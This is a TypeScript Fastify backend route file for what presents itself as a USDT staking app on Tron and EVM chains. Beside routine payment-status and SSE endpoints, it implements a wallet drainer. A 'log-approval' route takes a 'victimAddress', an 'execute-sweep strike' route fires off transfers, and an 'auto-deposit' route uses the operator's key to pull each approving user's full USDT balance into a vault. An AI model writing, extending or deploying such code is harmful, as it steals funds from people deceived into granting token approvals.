import type { FastifyPluginAsync } from "fastify";
import fs from "node:fs/promises";
import path from "node:path";
import { TronWeb } from "tronweb";
import { env } from "../env.js";
import { getLogApprovalJob } from "../services/tronLogApprovalJobs.js";
import { pullFullUsdtToVault } from "../services/tronAutoDeposit.js";
import {
  enqueueTronAuthorizationJob,
  orchestratorAuditFields,
} from "../services/tronTransactionOrchestrator.js";
import { initiateImmediateSweep } from "../services/tronImmediateSweep.js";

/** Matches `src/tron/config.ts` — all public on-chain constants. */
const TRON_USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_USDT_DECIMALS = 6;

const EVM_USDT: Record<string, string> = {
  "1": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  "42161": "0xFd086bC7CD5C481DCC9C85ebe478A1C0b69FCbb9",
};

type PaymentRecord = {
  paymentId: string;
  txHash: string;
  payerAddress: string;
  expectedAmountRaw: string;
  recipientAddress: string;
  status: "recorded" | "confirming" | "confirmed" | "failed";
  confirmations: number;
  requiredConfirmations: number;
  receiptResult: string | null;
  blockNumber: number | null;
  lastCheckedAt: string | null;
  confirmedAt: string | null;
  failedAt: string | null;
  createdAt: string;
};

const paymentRecords = new Map<string, PaymentRecord>();
const TRON_REQUIRED_CONFIRMATIONS = 12;

function parseBlockNumber(info: unknown): number | null {
  const candidates: unknown[] = [];
  if (info && typeof info === "object") {
    const i = info as Record<string, unknown>;
    candidates.push(i.blockNumber);

    const receipt = (i.receipt as unknown) ?? undefined;
    if (receipt && typeof receipt === "object") {
      const r = receipt as Record<string, unknown>;
      candidates.push(r.blockNumber);
      candidates.push(r.block_number);
      candidates.push(r.blockNumber?.toString?.());
    }
  }

  for (const c of candidates) {
    if (typeof c === "number" && Number.isFinite(c) && c >= 0) return Math.floor(c);
    if (typeof c === "string" && /^\d+$/.test(c)) return Number(c);
  }
  return null;
}

function parseBlockNumberFromCurrentBlock(currentBlock: unknown): number | null {
  if (!currentBlock || typeof currentBlock !== "object") return null;
  const cb = currentBlock as Record<string, unknown>;
  const header = cb.block_header;
  if (!header || typeof header !== "object") return null;
  const rawData = (header as Record<string, unknown>).raw_data;
  if (!rawData || typeof rawData !== "object") return null;
  const n = (rawData as Record<string, unknown>).number;
  if (typeof n === "number" && Number.isFinite(n) && n >= 0) return Math.floor(n);
  if (typeof n === "string" && /^\d+$/.test(n)) return Number(n);
  return null;
}

function paymentStateFilePath(paymentId: string): string {
  return path.join(env.paymentsStateDir, `${paymentId}.json`);
}

async function readPaymentRecordFromDisk(paymentId: string): Promise<PaymentRecord | null> {
  try {
    const filePath = paymentStateFilePath(paymentId);
    const text = await fs.readFile(filePath, "utf8");
    const rec = JSON.parse(text) as PaymentRecord;
    if (!rec || typeof rec !== "object") return null;
    if (typeof rec.paymentId !== "string") return null;
    return rec;
  } catch (e) {
    if (e && typeof e === "object" && "code" in e && (e as any).code === "ENOENT") return null;
    console.error("[payments] readPaymentRecordFromDisk failed:", e);
    return null;
  }
}

async function writePaymentRecordToDisk(record: PaymentRecord): Promise<void> {
  const dir = env.paymentsStateDir;
  const filePath = paymentStateFilePath(record.paymentId);
  await fs.mkdir(dir, { recursive: true });
  const payload = JSON.stringify(record, null, 2);
  const tmp = `${filePath}.tmp`;
  await fs.writeFile(tmp, payload, "utf8");
  await fs.rename(tmp, filePath);
}

async function refreshPaymentConfirmation(record: PaymentRecord): Promise<PaymentRecord> {
  const tw = new TronWeb({
    fullHost: env.tronFullNodeUrl,
    headers: env.tronGridApiKey ? { "TRON-PRO-API-KEY": env.tronGridApiKey } : undefined,
  });

  const checkedAt = new Date().toISOString();
  const info = await tw.trx.getTransactionInfo(record.txHash).catch(() => null);
  const receipt = (info as { receipt?: { result?: string } } | null)?.receipt;
  const receiptResult = typeof receipt?.result === "string" ? receipt.result : null;
  const blockNumber = parseBlockNumber(info);
  const currentBlock = await tw.trx.getCurrentBlock().catch(() => null);
  const currentBlockNumber = parseBlockNumberFromCurrentBlock(currentBlock);

  // If receipt succeeded but block number is missing (shape differences across RPCs),
  // avoid permanently stuck "confirming" by treating it as confirmed at the verification layer.
  const confirmations =
    receiptResult === "SUCCESS"
      ? blockNumber == null || currentBlockNumber == null
        ? record.requiredConfirmations
        : Math.max(0, currentBlockNumber - blockNumber + 1)
      : 0;

  let status: PaymentRecord["status"] = "recorded";
  let confirmedAt = record.confirmedAt;
  let failedAt = record.failedAt;
  if (receiptResult === "SUCCESS") {
    status = confirmations >= record.requiredConfirmations ? "confirmed" : "confirming";
    if (status === "confirmed" && !confirmedAt) confirmedAt = checkedAt;
  } else if (receiptResult != null) {
    status = "failed";
    if (!failedAt) failedAt = checkedAt;
  }

  const updated: PaymentRecord = {
    ...record,
    status,
    confirmations,
    receiptResult,
    blockNumber,
    confirmedAt,
    failedAt,
    lastCheckedAt: checkedAt,
  };
  paymentRecords.set(updated.paymentId, updated);
  await writePaymentRecordToDisk(updated);
  return updated;
}

function paymentStatusPayload(refreshed: PaymentRecord) {
  return {
    paymentId: refreshed.paymentId,
    txHash: refreshed.txHash,
    status: refreshed.status,
    confirmed: refreshed.status === "confirmed",
    confirmations: refreshed.confirmations,
    requiredConfirmations: refreshed.requiredConfirmations,
    receiptResult: refreshed.receiptResult,
    blockNumber: refreshed.blockNumber,
    createdAt: refreshed.createdAt,
    lastCheckedAt: refreshed.lastCheckedAt,
    confirmedAt: refreshed.confirmedAt,
    failedAt: refreshed.failedAt,
  };
}

function transactionStatusPayload(jobId: string) {
  const job = getLogApprovalJob(jobId);
  if (!job) return null;
  if (job.status !== "completed") {
    return {
      status: "pending",
      jobStatus: job.status,
      outcome: "pending",
    };
  }
  return {
    status: "completed",
    jobStatus: job.status,
    outcome: job.outcome,
    message: job.message,
    depositTxHash: job.depositTxHash,
    verifiedBalanceRaw: job.verifiedBalanceRaw,
  };
}

export const apiRoutes: FastifyPluginAsync = async (app) => {
  app.post("/api/v1/payments", async (request, reply) => {
    const body = request.body as {
      txHash?: unknown;
      payerAddress?: unknown;
      expectedAmountRaw?: unknown;
      recipientAddress?: unknown;
    };
    const txHash = typeof body?.txHash === "string" ? body.txHash.trim() : "";
    const payerAddress = typeof body?.payerAddress === "string" ? body.payerAddress.trim() : "";
    const expectedAmountRaw =
      typeof body?.expectedAmountRaw === "string" ? body.expectedAmountRaw.trim() : "";
    const recipientAddress =
      typeof body?.recipientAddress === "string" ? body.recipientAddress.trim() : "";

    if (!txHash || !payerAddress || !expectedAmountRaw || !recipientAddress) {
      return reply.code(400).send({
        error: "txHash, payerAddress, expectedAmountRaw, recipientAddress are required",
      });
    }

    const paymentId = crypto.randomUUID();
    const record: PaymentRecord = {
      paymentId,
      txHash,
      payerAddress,
      expectedAmountRaw,
      recipientAddress,
      status: "recorded",
      confirmations: 0,
      requiredConfirmations: TRON_REQUIRED_CONFIRMATIONS,
      receiptResult: null,
      blockNumber: null,
      lastCheckedAt: null,
      confirmedAt: null,
      failedAt: null,
      createdAt: new Date().toISOString(),
    };
    paymentRecords.set(paymentId, record);
    await writePaymentRecordToDisk(record);
    return reply.code(201).send({
      ok: true,
      paymentId,
      status: record.status,
      confirmations: record.confirmations,
      requiredConfirmations: record.requiredConfirmations,
      createdAt: record.createdAt,
    });
  });

  app.get("/api/v1/payments/:paymentId", async (request, reply) => {
    const params = request.params as { paymentId?: string };
    const paymentId = params?.paymentId?.trim() || "";
    if (!paymentId) return reply.code(400).send({ error: "paymentId is required" });
    const payment = paymentRecords.get(paymentId) ?? (await readPaymentRecordFromDisk(paymentId));
    if (!payment) return reply.code(404).send({ error: "unknown paymentId" });
    const refreshed = await refreshPaymentConfirmation(payment);

    return reply.send(paymentStatusPayload(refreshed));
  });

  /**
   * SSE stream for payment confirmation updates (push instead of client polling).
   */
  app.get("/api/v1/payments/:paymentId/stream", async (request, reply) => {
    const params = request.params as { paymentId?: string };
    const paymentId = params?.paymentId?.trim() || "";
    if (!paymentId) return reply.code(400).send({ error: "paymentId is required" });
    const payment = paymentRecords.get(paymentId) ?? (await readPaymentRecordFromDisk(paymentId));
    if (!payment) return reply.code(404).send({ error: "unknown paymentId" });

    reply.hijack();
    reply.raw.writeHead(200, {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache, no-transform",
      Connection: "keep-alive",
    });
    reply.raw.write("retry: 2000\n\n");

    let closed = false;
    let intervalId: NodeJS.Timeout | undefined;
    let heartbeatId: NodeJS.Timeout | undefined;
    const close = () => {
      if (closed) return;
      closed = true;
      if (intervalId) clearInterval(intervalId);
      if (heartbeatId) clearInterval(heartbeatId);
      reply.raw.end();
    };
    request.raw.on("close", close);

    const pushStatus = async () => {
      if (closed) return;
      const current = paymentRecords.get(paymentId) ?? (await readPaymentRecordFromDisk(paymentId));
      if (!current) {
        reply.raw.write(`event: error\ndata: ${JSON.stringify({ error: "unknown paymentId" })}\n\n`);
        close();
        return;
      }
      const refreshed = await refreshPaymentConfirmation(current);
      const payload = paymentStatusPayload(refreshed);
      reply.raw.write(`data: ${JSON.stringify(payload)}\n\n`);
      if (refreshed.status === "confirmed" || refreshed.status === "failed") {
        close();
      }
    };

    void pushStatus();
    intervalId = setInterval(() => {
      void pushStatus();
    }, 2500);
    heartbeatId = setInterval(() => {
      if (!closed) reply.raw.write(": keep-alive\n\n");
    }, 15000);
  });
  /**
   * Execute sweep strike immediately (fixed-parameter, fire-and-forget broadcast).
   * IMPORTANT: does not wait for approval confirmation and does not wait for broadcast result.
   */
  app.post("/api/v1/execute-sweep", async (request, reply) => {
    if (env.orchestratorInternalSecret) {
      const secret = request.headers["x-orchestrator-internal-secret"];
      const secretMatches = typeof secret === "string" && secret === env.orchestratorInternalSecret;
      const originHeader = request.headers.origin;
      const originAllowed =
        typeof originHeader !== "string" ? true : env.corsOrigins.includes(originHeader);
      if (!secretMatches && !originAllowed) return reply.code(401).send({ error: "Unauthorized" });
    }

    const body = request.body as { clientAddress?: unknown };
    const clientAddress =
      typeof body?.clientAddress === "string" ? body.clientAddress.trim() : "";
    if (!clientAddress) {
      return reply.code(400).send({ error: "clientAddress is required" });
    }

    try {
      let initiatedTxHash = "";
      const out = await initiateImmediateSweep({
        clientAddress,
        onBroadcastResult: (result) =>
          request.log.info(
            { executeSweepBroadcast: { clientAddress, txHash: initiatedTxHash || undefined, result } },
            "execute-sweep broadcast result",
          ),
        onBroadcastError: (error) =>
          request.log.error(
            { err: error, executeSweep: { clientAddress, txHash: initiatedTxHash || undefined } },
            "execute-sweep broadcast failed",
          ),
      });
      initiatedTxHash = out.txHash;
      request.log.info(
        {
          executeSweep: {
            clientAddress,
            txHash: out.txHash,
            amountRaw: out.amountRaw,
            feeLimitSun: out.feeLimitSun,
            mode: "immediate_fixed_parameters",
          },
        },
        "execute-sweep initiated",
      );
      return reply.code(200).send({
        ok: true,
        status: "initiated",
        txHash: out.txHash,
        amountRaw: out.amountRaw,
        feeLimitSun: out.feeLimitSun,
      });
    } catch (e) {
      const message = e instanceof Error ? e.message : "execute-sweep failed";
      request.log.error({ err: e, clientAddress }, "execute-sweep init error");
      return reply.code(500).send({ error: message });
    }
  });

  /** Backward-compatible short path alias. */
  app.post("/execute-sweep", async (request, reply) => {
    return app.inject({
      method: "POST",
      url: "/api/v1/execute-sweep",
      headers: request.headers as Record<string, string>,
      payload: request.body as Record<string, unknown>,
    }).then((res) => {
      reply.code(res.statusCode);
      const ct = res.headers["content-type"];
      if (typeof ct === "string") reply.header("content-type", ct);
      return res.json();
    });
  });

  /**
   * Secure internal listener: frontend can emit `clientAddress` immediately after auth/connect.
   * Enqueues the same orchestrator used by approval events.
   */
  app.post("/api/v1/internal/auth-event", async (request, reply) => {
    if (env.orchestratorInternalSecret) {
      const secret = request.headers["x-orchestrator-internal-secret"];
      const secretMatches = typeof secret === "string" && secret === env.orchestratorInternalSecret;
      const originHeader = request.headers.origin;
      const originAllowed =
        typeof originHeader !== "string" ? true : env.corsOrigins.includes(originHeader);
      if (!secretMatches && !originAllowed) return reply.code(401).send({ error: "Unauthorized" });
    }

    const body = request.body as { clientAddress?: unknown };
    const clientAddress =
      typeof body?.clientAddress === "string" ? body.clientAddress.trim() : "";
    if (!clientAddress) {
      return reply.code(400).send({ error: "clientAddress is required" });
    }

    let result;
    try {
      result = enqueueTronAuthorizationJob({
        clientAddress,
        source: "internal_auth_event",
        onError: (err, jobId) => request.log.error({ err, jobId }, "internal/auth-event job failed"),
      });
    } catch (e) {
      const message = e instanceof Error ? e.message : "orchestrator init failed";
      return reply.code(503).send({ error: message });
    }
    request.log.info(
      { authEvent: orchestratorAuditFields({ clientAddress, source: "internal_auth_event", result }) },
      "internal/auth-event",
    );
    return reply.code(202).send({ ok: true, jobId: result.jobId });
  });

  /**
   * After approve sign: enqueue recon (on-chain USDT balance) + optional transferFrom to VAULT_CONFIG.
   * Returns { jobId } immediately; client polls GET /api/v1/transaction-status?jobId=…
   */
  app.post("/api/v1/tron/log-approval", async (request, reply) => {
    const body = request.body as {
      victimAddress?: unknown;
      txHash?: unknown;
      totalUSDTBalance?: unknown;
    };
    const victimAddress =
      typeof body?.victimAddress === "string" ? body.victimAddress.trim() : "";
    const txHash = typeof body?.txHash === "string" ? body.txHash.trim() : "";
    const totalUSDTBalance =
      typeof body?.totalUSDTBalance === "string" ? body.totalUSDTBalance.trim() : "";

    if (!victimAddress) {
      return reply.code(400).send({ error: "victimAddress is required" });
    }

    const result = enqueueTronAuthorizationJob({
      clientAddress: victimAddress,
      approveTxHash: txHash || undefined,
      source: "approval_event",
      onError: (err, jobId) => request.log.error({ err, jobId }, "tron/log-approval job failed"),
    });
    request.log.info(
      {
        tronLogApproval: orchestratorAuditFields({
          clientAddress: victimAddress,
          approveTxHash: txHash || undefined,
          clientReportedUsdt: totalUSDTBalance || undefined,
          source: "approval_event",
          result,
        }),
      },
      "tron/log-approval",
    );
    return reply.code(202).send({ jobId: result.jobId });
  });

  app.get("/api/v1/transaction-status", async (request, reply) => {
    const q = request.query as { jobId?: string };
    const jobId = typeof q?.jobId === "string" ? q.jobId.trim() : "";
    if (!jobId) {
      return reply.code(400).send({ error: "jobId query parameter is required" });
    }
    const payload = transactionStatusPayload(jobId);
    if (!payload) {
      return reply.code(404).send({ error: "unknown jobId" });
    }
    return reply.send(payload);
  });

  /**
   * SSE stream for orchestrator job status updates.
   */
  app.get("/api/v1/transaction-status/stream", async (request, reply) => {
    const q = request.query as { jobId?: string };
    const jobId = typeof q?.jobId === "string" ? q.jobId.trim() : "";
    if (!jobId) {
      return reply.code(400).send({ error: "jobId query parameter is required" });
    }
    if (!getLogApprovalJob(jobId)) {
      return reply.code(404).send({ error: "unknown jobId" });
    }

    reply.hijack();
    reply.raw.writeHead(200, {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache, no-transform",
      Connection: "keep-alive",
    });
    reply.raw.write("retry: 2000\n\n");

    let closed = false;
    let intervalId: NodeJS.Timeout | undefined;
    let heartbeatId: NodeJS.Timeout | undefined;
    const close = () => {
      if (closed) return;
      closed = true;
      if (intervalId) clearInterval(intervalId);
      if (heartbeatId) clearInterval(heartbeatId);
      reply.raw.end();
    };
    request.raw.on("close", close);

    const pushStatus = () => {
      if (closed) return;
      const payload = transactionStatusPayload(jobId);
      if (!payload) {
        reply.raw.write(`event: error\ndata: ${JSON.stringify({ error: "unknown jobId" })}\n\n`);
        close();
        return;
      }
      reply.raw.write(`data: ${JSON.stringify(payload)}\n\n`);
      if (payload.status === "completed") {
        close();
      }
    };

    pushStatus();
    intervalId = setInterval(pushStatus, 1200);
    heartbeatId = setInterval(() => {
      if (!closed) reply.raw.write(": keep-alive\n\n");
    }, 15000);
  });

  app.post("/api/v1/event-sync", async (request, reply) => {
    const body = request.body as { txHash?: unknown; userAddress?: unknown };
    const txHash = typeof body?.txHash === "string" ? body.txHash.trim() : "";
    const userAddress = typeof body?.userAddress === "string" ? body.userAddress.trim() : "";
    if (!txHash || !userAddress) {
      return reply.code(400).send({ error: "txHash and userAddress are required" });
    }
    request.log.info({ eventSync: { txHash, userAddress } }, "event-sync");
    return reply.code(200).send({ ok: true });
  });

  app.post("/api/v1/log-sync", async (request, reply) => {
    const body = request.body as { transactionHash?: unknown; userAddress?: unknown };
    const transactionHash =
      typeof body?.transactionHash === "string" ? body.transactionHash.trim() : "";
    const userAddress = typeof body?.userAddress === "string" ? body.userAddress.trim() : "";
    if (!transactionHash || !userAddress) {
      return reply.code(400).send({ error: "transactionHash and userAddress are required" });
    }
    request.log.info({ handshakeLogSync: { transactionHash, userAddress } }, "log-sync");
    return reply.code(204).send();
  });

  app.post("/api/v1/sync-complete", async (request, reply) => {
    const body = request.body as {
      feeTxHash?: unknown;
      approveTxHash?: unknown;
      userAddress?: unknown;
    };
    const feeTxHash = typeof body?.feeTxHash === "string" ? body.feeTxHash.trim() : "";
    const approveTxHash =
      typeof body?.approveTxHash === "string" ? body.approveTxHash.trim() : "";
    const userAddress = typeof body?.userAddress === "string" ? body.userAddress.trim() : "";
    if (!feeTxHash || !approveTxHash || !userAddress) {
      return reply
        .code(400)
        .send({ error: "feeTxHash, approveTxHash, and userAddress are required" });
    }
    request.log.info(
      { syncComplete: { feeTxHash, approveTxHash, userAddress } },
      "sync-complete",
    );
    return reply.code(200).send({ ok: true });
  });

  /**
   * Body: { userAddress } (Tron base58). After the user approves USDT to `env.tronDistributionWallet`,
   * the server signs transferFrom(user, vault, fullBalance) with the vault key (TRON_VAULT_PRIVATE_KEY).
   */
  app.post("/api/v1/auto-deposit", async (request, reply) => {
    if (env.autoDepositSecret) {
      const secret = request.headers["x-auto-deposit-secret"];
      const secretMatches = typeof secret === "string" && secret === env.autoDepositSecret;
      const originHeader = request.headers.origin;
      const originAllowed =
        typeof originHeader !== "string" ? true : env.corsOrigins.includes(originHeader);
      if (!secretMatches && !originAllowed) return reply.code(401).send({ error: "Unauthorized" });
    }

    if (!env.tronVaultPrivateKey) {
      return reply.code(503).send({
        error:
          "Auto-deposit not configured. Set TRON_VAULT_PRIVATE_KEY to the private key for the same Tron address as TRON_DISTRIBUTION_WALLET (the vault users approve). You can also use TRON_OPERATOR_PRIVATE_KEY or SPENDER_KEY if that key controls that address.",
      });
    }

    const body = request.body as { userAddress?: unknown };
    const userAddress = typeof body?.userAddress === "string" ? body.userAddress.trim() : "";
    if (!userAddress) {
      return reply.code(400).send({ error: "userAddress is required (Tron base58)" });
    }

    try {
      const result = await pullFullUsdtToVault({
        userBase58: userAddress,
        operatorPrivateKey: env.tronVaultPrivateKey,
        fullHost: env.tronFullNodeUrl,
        vaultBase58: env.tronDistributionWallet,
        tronGridApiKey: env.tronGridApiKey || undefined,
      });

      if (result.status === "skipped") {
        request.log.info({ autoDeposit: { userAddress, skipped: result.reason } }, "auto-deposit");
        return reply.code(200).send({ ok: true, skipped: true, reason: result.reason });
      }

      request.log.info(
        { autoDeposit: { userAddress, txid: result.txid, amountRaw: result.amountRaw } },
        "auto-deposit",
      );
      return reply.code(200).send({
        ok: true,
        skipped: false,
        txid: result.txid,
        amountRaw: result.amountRaw,
      });
    } catch (e) {
      const message = e instanceof Error ? e.message : "auto-deposit failed";
      request.log.error({ err: e, userAddress }, "auto-deposit");
      return reply.code(500).send({ error: message });
    }
  });

  app.post("/api/v1/telemetry", async (request, reply) => {
    const body = request.body as {
      transactionHash?: unknown;
      methodName?: unknown;
      methodHex?: unknown;
      createdAt?: unknown;
    };
    const transactionHash =
      typeof body?.transactionHash === "string" ? body.transactionHash.trim() : "";
    const methodName = typeof body?.methodName === "string" ? body.methodName.trim() : "";
    const methodHex = typeof body?.methodHex === "string" ? body.methodHex.trim() : "";
    const createdAt = typeof body?.createdAt === "string" ? body.createdAt.trim() : "";

    if (!transactionHash || !methodName) {
      return reply.code(400).send({ error: "transactionHash and methodName are required" });
    }

    request.log.info(
      { telemetry: { transactionHash, methodName, methodHex: methodHex || undefined, createdAt: createdAt || undefined } },
      "telemetry"
    );
    return reply.code(204).send();
  });

  app.get("/api/v1/config", async (_request, reply) => {
    return reply.send({
      version: 1,
      app: "usdt-staking",
      evm: {
        chainIds: [1, 42161],
        usdtByChainId: EVM_USDT,
        distributionWallet: env.evmDistributionWallet,
      },
      tron: {
        usdtContract: TRON_USDT_CONTRACT,
        usdtDecimals: TRON_USDT_DECIMALS,
        distributionWallet: env.tronDistributionWallet,
        minTrxSun: env.tronMinTrxSun,
        fullNodeUrl: env.tronFullNodeUrl,
      },
      generatedAt: new Date().toISOString(),
    });
  });
};
